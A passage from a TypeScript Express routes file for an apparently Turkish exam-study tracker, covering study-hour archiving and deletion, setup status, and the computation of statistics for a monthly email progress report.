        await UserActivityLogger.log({
          userId: 'system',
          userName: 'Afyonlum',
          category: 'study',
          action: 'updated',
          entityId: id,
          entityType: 'study_hour',
          details: 'Güncellendi: ' + timeStr,
          payloadSnapshot: JSON.stringify({
            hours: hours,
            minutes: minutes,
            seconds: seconds,
            study_date: studyHours.study_date,
            total_seconds: (hours * 3600) + (minutes * 60) + seconds
          })
        });
      } catch (logError) {}
      
      logActivity('Çalışma Saati Güncellendi', timeStr);
      res.json(studyHours);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Geçersiz çalışma saati verisi", errors: error.errors });
      } else {
        res.status(500).json({ message: "Çalışma saati güncellenirken hata oluştu" });
      }
    }
  });

  app.patch("/api/study-hours/:id/archive", async (req, res) => {
    try {
      const { id } = req.params;
      
      // ID validation
      if (!id || typeof id !== 'string') {
        return res.status(400).json({ message: "Geçersiz ID" });
      }
      
      // Get existing study hour first to check if it exists and isn't already archived
      const existingStudyHours = await storage.getStudyHours();
      const studyHour = existingStudyHours.find((sh: any) => sh.id === id);
      
      if (!studyHour) {
        return res.status(404).json({ message: "Çalışma saati kaydı bulunamadı" });
      }
      
      if (studyHour.archived) {
        return res.status(400).json({ message: "Bu çalışma saati zaten arşivlenmiş" });
      }
      
      const updatedStudyHours = await storage.updateStudyHours(id, { 
        archived: true, 
        archivedAt: new Date().toISOString() 
      });
      
      if (!updatedStudyHours) {
        return res.status(500).json({ message: "Arşivleme işlemi başarısız oldu" });
      }
      
      // ✅ UserActivityLogger ile Discord bildirimi gönder
      const hours = studyHour.hours || 0;
      const minutes = studyHour.minutes || 0;
      const timeStr = hours > 0 ? hours + ' saat ' + minutes + ' dakika' : minutes + ' dakika';
      
      try {
        await UserActivityLogger.log({
          userId: 'system',
          userName: 'Afyonlum',
          category: 'study',
          action: 'archived',
          entityId: id,
          entityType: 'study_hour',
          details: 'Arşivlendi: ' + timeStr,
          payloadSnapshot: JSON.stringify({
            hours: hours,
            minutes: minutes,
            study_date: studyHour.study_date,
            archived: true,
            archivedAt: new Date().toISOString()
          })
        });
      } catch (logError) {}
      
      logActivity('Çalışma Saati Arşivlendi');
      res.json(updatedStudyHours);
    } catch (error) {
      console.error('Arşivleme hatası:', error);
      res.status(500).json({ message: "Çalışma saati arşivlenirken hata oluştu" });
    }
  });

  app.delete("/api/study-hours/:id", async (req, res) => {
    try {
      const { id} = req.params;
      
      // Silmeden önce veriyi al (Discord bildirimi için)
      const existingStudyHours = await storage.getStudyHours();
      const studyHourToDelete = existingStudyHours.find((sh: any) => sh.id === id);
      
      const deleted = await storage.deleteStudyHours(id);
      
      if (!deleted) {
        return res.status(404).json({ message: "Çalışma saati kaydı bulunamadı" });
      }
      
      // ✅ UserActivityLogger ile detaylı Discord bildirimi gönder
      if (studyHourToDelete) {
        const hours = studyHourToDelete.hours || 0;
        const minutes = studyHourToDelete.minutes || 0;
        const timeStr = hours > 0 ? `${hours} saat ${minutes} dakika` : `${minutes} dakika`;
        
        try {
          await UserActivityLogger.log({
            userId: 'system',
            userName: 'Afyonlum',
            category: 'study',
            action: 'deleted',
            entityId: id,
            entityType: 'study_hour',
            details: `Silindi: ${timeStr}`,
            payloadSnapshot: JSON.stringify({
              hours: hours,
              minutes: minutes,
              seconds: studyHourToDelete.seconds || 0,
              study_date: studyHourToDelete.study_date
            })
          });
        } catch (logError) {
          // Loglama hatası uygulamayı durdurmamalı
        }
      }
      
      logActivity('Çalışma Saati Silindi');
      res.json({ message: "Çalışma saati kaydı silindi" });
    } catch (error) {
      res.status(500).json({ message: "Çalışma saati silinirken hata oluştu" });
    }
  });

  app.get("/api/study-hours/archived", async (req, res) => {
    try {
      const studyHours = await storage.getArchivedStudyHours();
      res.json(studyHours);
    } catch (error) {
      res.status(500).json({ message: "Arşivlenmiş çalışma saatleri getirilirken hata oluştu" });
    }
  });

  // Setup routes - kurulum durumu kontrolü ve tamamlama
  app.get("/api/setup/status", async (req, res) => {
    try {
      const setupStatus = await storage.getSetupStatus();
      res.json(setupStatus || { completed: false, termsAccepted: false });
    } catch (error) {
      res.status(500).json({ message: "Kurulum durumu alınamadı" });
    }
  });

  app.post("/api/setup/complete", async (req, res) => {
    try {
      const validatedData = insertSetupCompletedSchema.parse(req.body);
      const setupRecord = await storage.completeSetup(validatedData.termsAccepted);
      res.json(setupRecord);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Geçersiz kurulum verisi", errors: error.errors });
      } else {
        res.status(500).json({ message: "Kurulum tamamlanırken hata oluştu" });
      }
    }
  });

  // Auto-archive route - otomatik olarak eski verileri arşivle
  app.post("/api/auto-archive", async (req, res) => {
    try {
      await storage.autoArchiveOldData();
      res.json({ message: "Eski veriler başarıyla arşivlendi" });
    } catch (error) {
      res.status(500).json({ message: "Auto-archive işlemi başarısız oldu" });
    }
  });

  // Send monthly report via email
  app.post("/api/reports/send", async (req, res) => {
    try {
      // Check if this is a manual request
      const isManualRequest = req.body.isManualRequest || false;
      const dayTotalQuestions = req.body.dayTotalQuestions || 0;
      const dayTotalCorrect = req.body.dayTotalCorrect || 0;
      const dayTotalWrong = req.body.dayTotalWrong || 0;
      const dayTotalEmpty = req.body.dayTotalEmpty || 0;
      
      // ✅ Önce ConfigManager'dan (lisansa özel), sonra .env'den (fallback) email ayarlarını al
      let emailUser = process.env.EMAIL_USER;
      let emailPass = process.env.EMAIL_PASS;
      let emailFrom = process.env.EMAIL_FROM;
      
      // Electron ortamında ConfigManager'dan lisansa özel ayarları kontrol et
      if (process.env.ELECTRON_ENV === 'true') {
        try {
          const electronPath = path.join(currentDir, '..', 'electron', 'config-manager.cjs');
          
          if (fs.existsSync(electronPath)) {
            // ✅ ESM-compatible require using createRequire
            const { getConfigManager } = requireESM(electronPath);
            const configManager = getConfigManager();
            
            // Lisansa özel email ayarları varsa bunları kullan
            const licenseEmailUser = configManager.get('EMAIL_USER');
            const licenseEmailPass = configManager.get('EMAIL_PASS');
            const licenseEmailFrom = configManager.get('EMAIL_FROM');
            
            if (licenseEmailUser) emailUser = licenseEmailUser;
            if (licenseEmailPass) emailPass = licenseEmailPass;
            if (licenseEmailFrom) emailFrom = licenseEmailFrom;
            
            console.log('✅ Email ayarları ConfigManager\'dan yüklendi (lisansa özel)');
          }
        } catch (error) {
          console.warn('⚠️  ConfigManager email ayarları okunamadı, .env fallback kullanılıyor:', error);
        }
      }
      
      // ✅ DÜZELTME: Daha detaylı hata mesajı ve telemetry
      if (!emailUser || !emailPass || !emailFrom) {
        const missingFields = [];
        if (!emailUser) missingFields.push('EMAIL_USER');
        if (!emailPass) missingFields.push('EMAIL_PASS');
        if (!emailFrom) missingFields.push('EMAIL_FROM');
        
        console.error('❌ Email ayarları eksik:', { 
          missingFields,
          hasElectronEnv: process.env.ELECTRON_ENV === 'true',
          processEnvKeys: Object.keys(process.env).filter(k => k.startsWith('EMAIL_'))
        });
        
        return res.status(400).json({ 
          message: `Email ayarlarınızı kontrol edin. Eksik alanlar: ${missingFields.join(', ')}. .env dosyasında bu değerlerin doğru tanımlandığından emin olun.` 
        });
      }
      
      // Her iki email adresini de alıcı olarak ekle (farklıysa)
      const recipients = [];
      if (emailUser) recipients.push(emailUser);
      if (emailFrom && emailFrom !== emailUser) recipients.push(emailFrom);
      const toEmails = recipients.join(', ');

      // Get all data for report including archived data
      const [tasks, questionLogs, examResults, studyHours, archivedTasks, archivedQuestions, archivedExams, archivedStudyHours, examSubjectNets] = await Promise.all([
        storage.getTasks(),
        storage.getQuestionLogs(),
        storage.getExamResults(),
        storage.getStudyHours(),
        storage.getArchivedTasks(),
        storage.getArchivedQuestionLogs(),
        storage.getArchivedExamResults(),
        storage.getArchivedStudyHours(),
        storage.getExamSubjectNets()
      ]);

      // Tüm verileri kullan (Panel'deki seçili tarih verilerini direkt geç)
      const allThisMonthQuestions = [...questionLogs, ...archivedQuestions];
      const allThisMonthExams = [...examResults, ...archivedExams];
      const allThisMonthTasks = [...tasks, ...archivedTasks];
      const allThisMonthStudy = [...studyHours, ...archivedStudyHours];
      
      const totalStudyMinutes = allThisMonthStudy.reduce((sum: number, s: any) => 
        sum + (s.hours || 0) * 60 + (s.minutes || 0), 0
      );
      
      // Calculate detailed statistics
      const completedTasks = allThisMonthTasks.filter((t: any) => t.completed).length;
      const activeTasks = allThisMonthTasks.filter((t: any) => !t.completed).length;
      
      // SON 7 GÜNÜN VERİLERİ (Email'deki EN ÜSTTEKİ "📚 ÇÖZÜLEN SORU" kutucuğu için)
      // Son 7 günün tarihlerini Türkiye saatinde oluştur (bugün dahil, 00:00'da yeni gün başlar)
      const last7DaysDates: string[] = [];
      const now = new Date();
      
      // Bugünden başlayarak son 7 günün tarihlerini oluştur
      // Her gün için UTC'den Europe/Istanbul'a çevirerek doğru tarihi al
      for (let i = 0; i < 7; i++) {
        const targetUTC = new Date(now);
        targetUTC.setDate(now.getDate() - i);
        
        // Bu UTC zamanını Europe/Istanbul saatine çevir (00:00'da doğru gün için)
        const dateStr = new Intl.DateTimeFormat('en-CA', { 
          timeZone: 'Europe/Istanbul',
          year: 'numeric',
          month: '2-digit',
          day: '2-digit'
        }).format(targetUTC);
        
        last7DaysDates.push(dateStr);
      }
      
      // DEBUG: Son 7 günün tarihlerini ve şu anki Türkiye saatini logla
      const turkeyNowStr = now.toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul', hour12: false });
      debugLog('📅 ŞU ANKİ TÜRKİYE SAATİ:', turkeyNowStr);
      debugLog('📅 EMAIL SON 7 GÜN TARİHLERİ:', last7DaysDates);
      
      // Türkiye saatinde tarih string'i döndüren yardımcı fonksiyon (SAAT 00:00'DA YENİ GÜN BAŞLAR)
      const toTurkeyDateString = (input: any): string => {
        // Eğer Date objesi ise direkt çevir
        if (input instanceof Date) {
          return new Intl.DateTimeFormat('en-CA', { 
            timeZone: 'Europe/Istanbul',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit'
          }).format(input);
        }
        
        // Eğer record ise önce study_date veya exam_date kullan (kullanıcının elle girdiği tarih)
        let dateStr = input.study_date || input.exam_date;
        
        // study_date veya exam_date yoksa createdAt kullan (otomatik oluşturulma tarihi)
        if (!dateStr && input.createdAt) {
          const created = new Date(input.createdAt);
          dateStr = new Intl.DateTimeFormat('en-CA', { 
            timeZone: 'Europe/Istanbul',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit'
          }).format(created);
        }
        
        return dateStr;
      };
      
      // SON 7 GÜNÜN SORULARI (hem soru kayıtları hem denemeler)
      let last7DaysQuestionCorrect = 0;
      let last7DaysQuestionWrong = 0;
      let last7DaysQuestionBlank = 0;
      let last7DaysQuestionCount = 0;
      
      allThisMonthQuestions.forEach((log: any) => {
        const logDate = toTurkeyDateString(log);
        
        if (last7DaysDates.includes(logDate)) {
          last7DaysQuestionCorrect += Number(log.correct_count) || 0;
          last7DaysQuestionWrong += Number(log.wrong_count) || 0;
          last7DaysQuestionBlank += Number(log.blank_count) || 0;
          last7DaysQuestionCount++;
        }
      });
      
      debugLog('📝 SON 7 GÜN SORU KAYITLARI:', last7DaysQuestionCount, 'kayıt');
      
      let last7DaysExamCorrect = 0;
      let last7DaysExamWrong = 0;
      let last7DaysExamBlank = 0;
      let last7DaysExamCount = 0;
      
      allThisMonthExams.forEach((exam: any) => {
        const examDate = toTurkeyDateString(exam);
        
        if (last7DaysDates.includes(examDate)) {
          last7DaysExamCount++;
          const examNets = examSubjectNets.filter((n: any) => n.exam_id === exam.id);
          examNets.forEach((netData: any) => {
            last7DaysExamCorrect += Number(netData.correct_count) || 0;
            last7DaysExamWrong += Number(netData.wrong_count) || 0;
            last7DaysExamBlank += Number(netData.blank_count || netData.empty_count) || 0;
          });
        }
      });
      
      debugLog('📝 SON 7 GÜN DENEME KAYITLARI:', last7DaysExamCount, 'deneme');
      
      // SON 7 GÜNÜN TOPLAM VERİLERİ (EN ÜSTTEKİ KUTUCUK İÇİN)
      // "Çözülen soru" = doğru + yanlış (boş çözülmemiş sayılır)
      const monthlyTotalQuestions = (last7DaysQuestionCorrect + last7DaysQuestionWrong) + (last7DaysExamCorrect + last7DaysExamWrong);
      const monthlyTotalCorrect = 0; // Email template'de kullanılmıyor
      const monthlyTotalWrong = 0;
      const monthlyTotalEmpty = 0;
      
      // DEBUG: Son 7 günün soru sayılarını logla
      debugLog('📊 SON 7 GÜN SORULAR:', {
        sorularDoğru: last7DaysQuestionCorrect,
        sorularYanlış: last7DaysQuestionWrong,
        denemelerDoğru: last7DaysExamCorrect,
        denemelerYanlış: last7DaysExamWrong,
        toplam: monthlyTotalQuestions
      });
      
      // SON 7 GÜNÜN DENEMELERİ (Email'deki "🎯 ÇÖZÜLEN DENEME" kutucuğu için)
      const last7DaysExams = allThisMonthExams.filter((exam: any) => {
        const examDate = toTurkeyDateString(exam);
        return last7DaysDates.includes(examDate);
      });
      
      // SON 7 GÜNÜN GÖREVLERİ (Email'deki "✅ TAMAMLANAN GÖREVLER" kutucuğu için)
      // Tamamlanma tarihine göre filtrele (completedAt veya archivedAt)
      const last7DaysTasks = allThisMonthTasks.filter((task: any) => {
        let taskDate = null;
        
        // Tamamlanmış görevler için completedAt veya archivedAt kullan
        if (task.completed && task.completedAt) {
          taskDate = toTurkeyDateString(new Date(task.completedAt));
        } else if (task.archived && task.archivedAt) {
          taskDate = toTurkeyDateString(new Date(task.archivedAt));
        } else if (task.dueDate) {
          taskDate = task.dueDate.split('T')[0];
        } else if (task.createdAt) {
          taskDate = toTurkeyDateString(new Date(task.createdAt));
        }
        
        return taskDate && last7DaysDates.includes(taskDate);
      });
      
      const last7DaysCompletedTasks = last7DaysTasks.filter((t: any) => t.completed).length;
      
      // SON 7 GÜNÜN AKTİVİTELERİ (Email'deki "📈 TOPLAM AKTİVİTE" kutucuğu için)
      const last7DaysQuestionLogs = allThisMonthQuestions.filter((log: any) => {
        const logDate = toTurkeyDateString(log);
        return last7DaysDates.includes(logDate);
      });
      
      const last7DaysStudyHours = allThisMonthStudy.filter((sh: any) => {
        // study_date varsa kullan, yoksa createdAt'i Türkiye saatine çevir
        const studyDate = sh.study_date || (sh.createdAt ? toTurkeyDateString(new Date(sh.createdAt)) : null);
        return studyDate && last7DaysDates.includes(studyDate);
      });
      
      const last7DaysTotalActivities = last7DaysTasks.length + last7DaysQuestionLogs.length + last7DaysExams.length + last7DaysStudyHours.length;
      
      // TÜM ZAMANLARIN TOPLAM VERİLERİ ("Çözülen Tüm Sorular" detay bölümü için)
      // Soru kayıtlarından
      const allTimeQuestionCorrect = allThisMonthQuestions.reduce((sum: number, log: any) => 
        sum + (Number(log.correct_count) || 0), 0
      );
      const allTimeQuestionWrong = allThisMonthQuestions.reduce((sum: number, log: any) => 
        sum + (Number(log.wrong_count) || 0), 0
      );
      const allTimeQuestionBlank = allThisMonthQuestions.reduce((sum: number, log: any) => 
        sum + (Number(log.blank_count) || 0), 0
      );
      
      // Deneme sonuçlarından
      let allTimeExamCorrect = 0;
      let allTimeExamWrong = 0;
      let allTimeExamBlank = 0;
      
      allThisMonthExams.forEach((exam: any) => {
        const examNets = examSubjectNets.filter((n: any) => n.exam_id === exam.id);
        examNets.forEach((netData: any) => {
          allTimeExamCorrect += Number(netData.correct_count) || 0;
          allTimeExamWrong += Number(netData.wrong_count) || 0;
          allTimeExamBlank += Number(netData.blank_count || netData.empty_count) || 0;
        });
      });
      
      // TÜM ZAMANLARIN TOPLAM VERİLERİ
      const totalCorrect = allTimeQuestionCorrect + allTimeExamCorrect;
      const totalWrong = allTimeQuestionWrong + allTimeExamWrong;
      const totalEmpty = allTimeQuestionBlank + allTimeExamBlank;
      const totalQuestions = totalCorrect + totalWrong; // Sadece doğru + yanlış (boş dahil değil)
      
      // "❌ Bu Ay Hatalı Konular" - Priority Topics sayısını kullan (dashboard'daki Eksik Olduğum Konular)
      const priorityTopics = await storage.getPriorityTopics();
      const wrongTopicsCount = priorityTopics.length;
      
      // "EN ÇOK HATA YAPILAN DERSLER" - Soru logları ve sınav sonuçlarından hesapla
      const subjectErrorCount: any = {};
      
      // Soru loglarından hataları hesapla
      allThisMonthQuestions.forEach((q: any) => {
        const subject = q.subject || 'Diğer';
        const wrongCount = parseInt(q.wrong_count || "0");
        const examType = q.exam_type || 'TYT';
        
        if (wrongCount > 0) {
          if (!subjectErrorCount[subject]) {
            subjectErrorCount[subject] = { wrong: 0, area: examType };
          }
          subjectErrorCount[subject].wrong += wrongCount;
        }
      });
      
      // Deneme sonuçlarından hataları hesapla
      const allExamsForErrors = [...allThisMonthExams];
      allExamsForErrors.forEach((exam: any) => {
        const examNets = examSubjectNets.filter((n: any) => n.exam_id === exam.id);
        const examType = exam.exam_type || 'TYT';
        
        examNets.forEach((netData: any) => {
          const subject = netData.subject || netData.subject_name || 'Diğer';
          const wrongCount = parseInt(netData.wrong_count || "0");
          
          if (wrongCount > 0) {
            if (!subjectErrorCount[subject]) {
              subjectErrorCount[subject] = { wrong: 0, area: examType };
            }
            subjectErrorCount[subject].wrong += wrongCount;
          }
        });
      });
      
      // mostWrongSubjects'i oluştur (ders adı ve alan bilgisi ile)
      const mostWrongSubjects = Object.entries(subjectErrorCount)
        .map(([subject, stats]: any) => [`${subject} (${stats.area})`, stats])
        .sort((a: any, b: any) => b[1].wrong - a[1].wrong)
        .slice(0, 6)
        .filter((s: any) => s[1].wrong > 0);
      
      // Get longest study day (bu ay yapılanlar)
      const longestStudy = allThisMonthStudy.reduce((max: any, curr: any) => {
        const currMinutes = (curr.hours || 0) * 60 + (curr.minutes || 0);
        const maxMinutes = max ? (max.hours || 0) * 60 + (max.minutes || 0) : 0;
        return currMinutes > maxMinutes ? curr : max;
      }, null);
      
      const longestStudyDate = longestStudy ? new Date(longestStudy.study_date).toLocaleDateString('tr-TR', { day: 'numeric', month: 'long', year: 'numeric' }) : '';
      const longestStudyTime = longestStudy ? `${String(longestStudy.hours || 0).padStart(2, '0')}:${String(longestStudy.minutes || 0).padStart(2, '0')}:${String(longestStudy.seconds || 0).padStart(2, '0')}` : '00:00:00';
      
      // Separate general and branch exams (bu ay yapılanlar)
      const generalExams = allThisMonthExams.filter((e: any) => e.exam_scope !== 'branch');
      const branchExams = allThisMonthExams.filter((e: any) => e.exam_scope === 'branch');
      
      // SORUN 5 ÇÖZÜMÜ: TYT ve AYT genel denemelerini ayır ve sırala
      const tytGeneralExams = generalExams.filter((e: any) => e.exam_type === 'TYT');
      const aytGeneralExams = generalExams.filter((e: any) => e.exam_type === 'AYT');
      // TYT önce, sonra AYT gelecek şekilde sırala
      const sortedGeneralExams = [...tytGeneralExams, ...aytGeneralExams];
      
      // Calculate TYT and AYT record nets from examSubjectNets data - SADECE İLGİLİ TİPTEKİ DENEMELERDEN
      let maxTytNet = { net: 0, exam_name: '', exam_date: '' };
      let maxAytNet = { net: 0, exam_name: '', exam_date: '' };
      
      // TYT netleri için sadece TYT denemelerini kontrol et
      tytGeneralExams.forEach((exam: any) => {
        const examNets = examSubjectNets.filter((n: any) => n.exam_id === exam.id);
        const tytNetValue = examNets.reduce((sum: number, n: any) => sum + parseFloat(n.net_score || 0), 0);
        
        if (tytNetValue > maxTytNet.net) {
          maxTytNet = { net: tytNetValue, exam_name: exam.exam_name, exam_date: exam.exam_date };
        }
      });
      
      // AYT netleri için sadece AYT denemelerini kontrol et
      aytGeneralExams.forEach((exam: any) => {
        const examNets = examSubjectNets.filter((n: any) => n.exam_id === exam.id);
        const aytNetValue = examNets.reduce((sum: number, n: any) => sum + parseFloat(n.net_score || 0), 0);
        
        if (aytNetValue > maxAytNet.net) {
          maxAytNet = { net: aytNetValue, exam_name: exam.exam_name, exam_date: exam.exam_date };
        }
      });
      
      // Calculate streak (En Uzun Çalışma Serisi)
      const allStudyDates = [...studyHours, ...archivedStudyHours]
        .map(sh => sh.study_date)
        .sort();
      let longestStreak = 0;
      let currentStreak = 0;
      let lastDate: Date | null = null;
      
      for (const dateStr of allStudyDates) {
        const currentDate = new Date(dateStr);
        if (lastDate) {
          const dayDiff = Math.floor((currentDate.getTime() - lastDate.getTime()) / (1000 * 60 * 60 * 24));
          if (dayDiff === 1) {
            currentStreak++;
          } else if (dayDiff > 1) {
            longestStreak = Math.max(longestStreak, currentStreak);
            currentStreak = 1;
          }
        } else {
          currentStreak = 1;
        }
        lastDate = currentDate;
      }
      longestStreak = Math.max(longestStreak, currentStreak);
      
      // Calculate archived counts
      const archivedTasksCount = archivedTasks.length;
      const archivedQuestionsCount = archivedQuestions.length;
      const archivedExamsCount = archivedExams.length;
      
      // Decide if we need to split emails (>10 general exams OR >10 branch exams OR >10 questions)
      const shouldSplitEmails = generalExams.length > 10 || branchExams.length > 10 || allThisMonthQuestions.length > 10;
      
      // Calculate longest study evaluation message
      const longestStudyHours = longestStudy ? (longestStudy.hours || 0) + (longestStudy.minutes || 0) / 60 : 0;
      let studyEvaluation = '';
      let studyColor = '';
      
      if (longestStudyHours < 3) {
        studyEvaluation = '⚠️ Çalışma süresi düşük! Hedeflerinize ulaşmak için daha fazla çaba göstermelisiniz.';
        studyColor = '#ef5350';
      } else if (longestStudyHours < 6) {
        studyEvaluation = '💪 Orta seviye çalışma! Biraz daha artırarak rekor kırabilirsiniz!';
        studyColor = '#ffa726';
      } else {
        studyEvaluation = '🔥 Harika çalışma! Bu tempoyu koruyarak hedefinize ulaşabilirsiniz!';
        studyColor = '#66bb6a';
      }
      
      // Calculate success rate for all questions
      const successRate = totalQuestions > 0 ? ((totalCorrect / totalQuestions) * 100).toFixed(1) : '0.0';
      
      // Activity-based motivation messages - Soru, deneme ve görevlere göre detaylı değerlendirme
      const totalActivities = allThisMonthTasks.length + allThisMonthQuestions.length + allThisMonthExams.length + allThisMonthStudy.length;
      const generalExamsCount = generalExams.length;
      let activityMotivation = '';
      let activityColor = '';
      
      // Soru sayısı, genel deneme ve tamamlanan görevlere göre puan hesapla
      let motivationScore = 0;
      
      // Soru puanı (0-50: 1, 50-150: 2, 150-350: 3, 350-500: 4, 500-1000: 5, 1000+: 6)
      if (totalQuestions >= 1000) motivationScore += 6;
      else if (totalQuestions >= 500) motivationScore += 5;
      else if (totalQuestions >= 350) motivationScore += 4;
      else if (totalQuestions >= 150) motivationScore += 3;
      else if (totalQuestions >= 50) motivationScore += 2;
      else if (totalQuestions > 0) motivationScore += 1;
      
      // Genel deneme puanı (1-2: 1, 2-4: 2, 4-6: 3, 6-8: 4, 8-10: 5, 10+: 6)
      if (generalExamsCount >= 10) motivationScore += 6;
      else if (generalExamsCount >= 8) motivationScore += 5;
      else if (generalExamsCount >= 6) motivationScore += 4;
      else if (generalExamsCount >= 4) motivationScore += 3;
      else if (generalExamsCount >= 2) motivationScore += 2;
      else if (generalExamsCount >= 1) motivationScore += 1;
      
      // Tamamlanan görev puanı (1-3: 1, 3-6: 2, 6-9: 3, 9-13: 4, 13-15: 5, 15-20: 6, 20-30: 7, 30+: 8)
      if (completedTasks >= 30) motivationScore += 8;
      else if (completedTasks >= 20) motivationScore += 7;
      else if (completedTasks >= 15) motivationScore += 6;
      else if (completedTasks >= 13) motivationScore += 5;
      else if (completedTasks >= 9) motivationScore += 4;
      else if (completedTasks >= 6) motivationScore += 3;
      else if (completedTasks >= 3) motivationScore += 2;
      else if (completedTasks >= 1) motivationScore += 1;
      
      // Motivasyon puanına göre mesaj belirle
      if (motivationScore === 0) {
        activityMotivation = '📚 Henüz aktivite eklenmemiş. Hadi başlayalım!';
        activityColor = '#9e9e9e';
      } else if (motivationScore <= 3) {
        activityMotivation = '🌱 Güzel bir başlangıç! Her adım seni hedefe yaklaştırıyor. Devam et!';
        activityColor = '#ff9800';
      } else if (motivationScore <= 6) {
        activityMotivation = '💪 Çok iyi gidiyorsun! Düzenli çalışman başarının temelidir. Bu temponu koru!';
        activityColor = '#ffa726';
      } else if (motivationScore <= 10) {
        activityMotivation = '🔥 Muhteşem bir performans sergiliyorsun! Disiplinin ve çalışma azmin takdire şayan. Başarı çok yakın!';
        activityColor = '#66bb6a';
      } else if (motivationScore <= 14) {
        activityMotivation = '🏆 Olağanüstü! Bu efsane çalışma temposu ile hayallerindeki üniversite seninle gurur duyacak!';
        activityColor = '#43a047';
      } else {
        activityMotivation = '⚡ İnanılmaz! Sen bir çalışma makinesin! Bu azminle hiçbir hedef sana uzak değil. Tebrikler şampiyon!';
        activityColor = '#2e7d32';
      }
      
      // Calculate subject-based statistics from question logs AND exams (general + branch)
      const subjectStats: any = {};
      
      // Soru loglarından veri ekle (bu ay yapılanlar)
      allThisMonthQuestions.forEach((q: any) => {
        const subject = q.subject || 'Diğer';
        const area = q.exam_type || q.area || 'Genel'; // TYT, AYT, veya Genel
        const key = `${subject} (${area})`;
        
        if (!subjectStats[key]) {
          subjectStats[key] = { correct: 0, wrong: 0, empty: 0, total: 0, area };
        }
        subjectStats[key].correct += parseInt(q.correct_count || "0");
        subjectStats[key].wrong += parseInt(q.wrong_count || "0");
        subjectStats[key].empty += parseInt(q.empty_count || q.blank_count || "0");
        subjectStats[key].total += parseInt(q.correct_count || "0") + parseInt(q.wrong_count || "0") + parseInt(q.empty_count || q.blank_count || "0");
      });
      
      // Genel ve branş denemelerinden veri ekle
      const allExamsForStats = [...generalExams, ...branchExams];
      allExamsForStats.forEach((exam: any) => {
        const examNets = examSubjectNets.filter((n: any) => n.exam_id === exam.id);
        const area = exam.exam_type || 'Genel'; // TYT, AYT, veya Genel
        
        examNets.forEach((netData: any) => {
          const subject = netData.subject || netData.subject_name || 'Bilinmeyen';
          const key = `${subject} (${area})`;
          
          if (!subjectStats[key]) {
            subjectStats[key] = { correct: 0, wrong: 0, empty: 0, total: 0, area };
          }
          
          const correct = parseInt(netData.correct_count || "0");
          const wrong = parseInt(netData.wrong_count || "0");
          const empty = parseInt(netData.empty_count || "0");
          
          subjectStats[key].correct += correct;
          subjectStats[key].wrong += wrong;
          subjectStats[key].empty += empty;
          subjectStats[key].total += correct + wrong + empty;
        });
      });
      
      // Sort subjects by different criteria (mostSolvedSubjects ve mostCorrectSubjects için)
      const subjectEntries = Object.entries(subjectStats);
      
      const mostSolvedSubjects = subjectEntries
        .sort((a: any, b: any) => b[1].total - a[1].total)
        .slice(0, 3)
        .filter((s: any) => s[1].total > 0);
      
      const mostCorrectSubjects = subjectEntries
        .sort((a: any, b: any) => b[1].correct - a[1].correct)
        .slice(0, 3)
        .filter((s: any) => s[1].correct > 0);
      
      // Find date with most questions solved (bu ay yapılanlar)
      const dateQuestionCount: any = {};
      allThisMonthQuestions.forEach((q: any) => {
        const date = new Date(q.log_date || q.study_date).toLocaleDateString('tr-TR');
        const count = parseInt(q.correct_count || "0") + parseInt(q.wrong_count || "0") + parseInt(q.empty_count || q.blank_count || "0");
        dateQuestionCount[date] = (dateQuestionCount[date] || 0) + count;
      });
      
      let mostQuestionsDate = '';
      let mostQuestionsCount = 0;
      Object.entries(dateQuestionCount).forEach(([date, count]: any) => {
        if (count > mostQuestionsCount) {
          mostQuestionsCount = count;
          mostQuestionsDate = date;
        }
      });
      
      // Calculate branch exam records - TYT ve AYT'den sadece 1'er tane en yüksek net
      const branchRecords: any = {};
      let maxTytBranch: any = { net: 0, exam_name: '', date: '', subject: '', examType: 'TYT' };
      let maxAytBranch: any = { net: 0, exam_name: '', date: '', subject: '', examType: 'AYT' };
      
      branchExams.forEach((exam: any) => {
        const examNets = examSubjectNets.filter((n: any) => n.exam_id === exam.id);
        const examType = exam.exam_type || 'TYT';
        
        examNets.forEach((netData: any) => {
          const subject = netData.subject || netData.subject_name || 'Bilinmeyen';
          const net = Number(netData.net_score) || 0;
          
          if (examType.toUpperCase().includes('TYT')) {
            if (net > maxTytBranch.net) {
              maxTytBranch = { 
                net: net, 
                exam_name: exam.exam_name || exam.display_name, 
                date: exam.exam_date,
                subject: subject,
                examType: 'TYT'
              };
            }
          } else {
            if (net > maxAytBranch.net) {
              maxAytBranch = { 
                net: net, 
                exam_name: exam.exam_name || exam.display_name, 
                date: exam.exam_date,
                subject: subject,
                examType: 'AYT'
              };
            }
          }
        });
      });
      
      // TYT ve AYT rekorlarını ekle (varsa)
      if (maxTytBranch.net > 0) {
        branchRecords[maxTytBranch.subject] = {
          net: maxTytBranch.net.toFixed(2),
          exam_name: maxTytBranch.exam_name,
          date: maxTytBranch.date,
          subject: maxTytBranch.subject,
          examType: 'TYT'
        } as any;
      }
      if (maxAytBranch.net > 0) {
        branchRecords[maxAytBranch.subject] = {
          net: maxAytBranch.net.toFixed(2),
          exam_name: maxAytBranch.exam_name,
          date: maxAytBranch.date,
          subject: maxAytBranch.subject,
          examType: 'AYT'
        } as any;
      }
      
      // Get completed topics and questions history from localStorage (client-side data sent in request body)
      // FALLBACK: Eğer client'tan veri gelmezse (otomatik raporlar için), tasks'tan hesapla
      let completedTopicsHistory = req.body.completedTopicsHistory || [];
      let completedQuestionsHistory = req.body.completedQuestionsHistory || [];
      let completedTopics = req.body.completedTopicsCount || 0;
      let completedQuestions = req.body.completedQuestionsCount || 0;
      
      // Fallback: Client'tan veri yoksa server-side'dan hesapla
      if (completedTopicsHistory.length === 0 && completedQuestionsHistory.length === 0) {
        const allTasksForFallback = [...tasks, ...archivedTasks];
        const fallbackData = allTasksForFallback
          .filter((t: any) => t.completed && (t.category === 'wrong_topic' || t.title?.toLowerCase().includes('konu') || t.title?.toLowerCase().includes('hata')))
          .map((t: any) => ({
            title: t.title,
            subject: t.subject || 'Genel',
            source: t.category === 'wrong_topic' ? 'task' : 'general',
            completedAt: t.completedAt || t.createdAt
          }))
          .sort((a: any, b: any) => new Date(b.completedAt).getTime() - new Date(a.completedAt).getTime())
          .slice(0, 15);
        
        completedTopicsHistory = fallbackData;
        completedTopics = fallbackData.length;
        completedQuestionsHistory = [];
